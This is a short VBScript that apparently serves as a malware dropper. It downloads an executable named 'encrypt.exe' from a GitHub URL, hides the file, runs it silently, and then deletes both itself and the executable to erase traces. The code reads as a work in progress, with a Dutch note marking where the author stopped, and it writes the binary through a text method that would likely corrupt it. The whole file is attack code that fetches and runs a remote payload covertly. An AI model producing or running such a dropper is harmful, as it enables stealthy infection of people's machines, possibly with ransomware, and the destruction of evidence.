Option Explicit

Dim objWinHTTP, objFSO, objFile, objShell
Dim url, localFilePath, strScriptPath, strBatPath

' URL of the file to download
url = "https://raw.githubusercontent.com/Sap196/PWS_new/main/encrypt.exe"

' Local path where the file will be saved
localFilePath = "encrypt.exe"

' Get the path of the script
strScriptPath = WScript.ScriptFullName

' Specify the path of the bat file
strBatPath = "encrypt.exe"

' Create a WinHTTP object
Set objWinHTTP = CreateObject("WinHttp.WinHttpRequest.5.1")
objWinHTTP.Open "GET", url, False
objWinHTTP.Send

' Check if the request was successful (status code 200)
If objWinHTTP.Status = 200 Then
    ' Create a FileSystemObject to write the file
    Set objFSO = CreateObject("Scripting.FileSystemObject")
    Set objFile = objFSO.CreateTextFile(localFilePath, True)

    ' Write the downloaded content to the file
    objFile.Write objWinHTTP.ResponseText

    ' Close the file
    objFile.Close
    Set objFile = objFSO.GetFile(localFilePath)
    objFile.Attributes = objFile.Attributes + 2  ' Add the Hidden attribute
End If

' Run the downloaded batch file
Set objShell = CreateObject("WScript.Shell")
objShell.Run "encrypt.exe > output.txt", 0, False
Set objShell = Nothing

' HIER WAS IK GEBLEVEN
'---------------------

WScript.Sleep 10000

' Delete the script file
Set objFSO = CreateObject("Scripting.FileSystemObject")
objFSO.DeleteFile strScriptPath

' Delete the bat file
If objFSO.FileExists(strBatPath) Then
    objFSO.DeleteFile strBatPath
End If
